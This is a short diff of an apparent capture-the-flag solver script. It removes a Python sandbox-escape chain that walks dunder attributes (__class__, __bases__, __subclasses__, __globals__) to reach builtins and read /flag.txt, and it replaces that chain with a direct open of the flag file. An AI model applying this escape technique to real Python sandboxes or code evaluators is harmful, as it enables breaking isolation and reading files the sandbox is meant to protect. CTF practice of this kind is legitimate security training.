@@ -22,13 +22,8 @@ def encode(text, rotation):
 # ============== WORKING EXPLOIT ==============
 
 EXPLOIT_STEPS = [
-    (0,  'u=chr(95)*2'),                                           # u = '__'
-    (7,  'c=getattr("",u+"class"+u)'),                             # c = <class 'str'>
-    (14, 'b=getattr(c,u+"bases"+u)[0]'),                           # b = <class 'object'>
-    (21, 's=getattr(b,u+"subclasses"+u)()'),                       # s = all subclasses
-    (28, 'w=s[158]'),                                              # w = os._wrap_close (index varies!)
-    (35, 'g=getattr(getattr(w,u+"init"+u),u+"globals"+u)'),        # g = __globals__
-    (42, 'print(g[u+"builtins"+u]["open"]("/flag.txt").read())'),  # READ FLAG!
+    (0,  'print(globals())'),                                           # See what's available
+    (7,  'print(open("/flag.txt").read())'),                           # Direct flag read!
 ]
 
 def generate_exploit():
